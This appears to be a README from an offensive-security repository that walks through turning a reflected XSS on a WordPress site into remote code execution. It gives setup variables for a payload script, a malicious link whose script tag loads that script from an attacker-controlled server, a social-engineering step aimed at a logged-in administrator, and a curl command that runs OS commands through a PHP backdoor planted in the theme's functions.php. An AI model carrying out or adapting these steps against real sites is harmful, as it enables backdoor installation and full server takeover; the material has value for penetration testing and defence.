# [authn] Patch File (RCE)

## Test Environment

### Web Browsers (20250426)

* [x] Mozilla Firefox 137.0.2 (64-bit)
* [x] Google Chrome 135.0.7049.115 (64-bit)
* [x] Microsoft Edge 135.0.3179.98 (64-bit)

## Exploitation Steps

1. [setup exploit] identify target WordPress theme

    *(enumerate installed WordPress themes installed on target site)*

2. [setup exploit] change payload variable values (`patchFileWP.js`)

    `phpBdURL` - URL of PHP backdoor to be installed on target site

    `themeName` - WordPress theme name to be patched

    `wpRoot` - path to WordPress installation on the target system (e.g. `"/wordpress"`)

3. [setup exploit] setup web server (to serve the payload/backdoor)

    * **NOTE**: update/customize PHP backdoor in `bd.txt`

4. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.10/wp-login.php

5. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.10/rxss.php?q=<script src=http://192.168.5.5/patchFileWP.js></script>
    ```

    * **NOTES**:
      * `192.168.5.10` - target WordPress site
      * `192.168.5.5` - web server hosting the payload

6. [post exploit] execute OS command

    ```
    curl "http://192.168.5.10/wp-content/themes/twentytwentyfive/functions.php?pass=test&cmd=id"
    ```

    * **NOTE**: endpoint URL constructed based on specified WordPress theme name + `functions.php`

7. [restore file] restore file via GUI

    *WordPress -> Tools -> Theme File Editor -> Select theme to edit - (select target theme from droplist) -> Select -> Theme Functions (functions.php) -> (remove backdoor) -> Update File*

## Screenshot

* **NOTE**: the screenshot covers steps 2 to 6 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/WordPress/PatchFile/screenshots/WordPress_-_patch_file_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/WordPress/PatchFile/screenshots/WordPress_-_patch_file_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/f09429bc-da83-476f-9250-91ee15f7f4b0
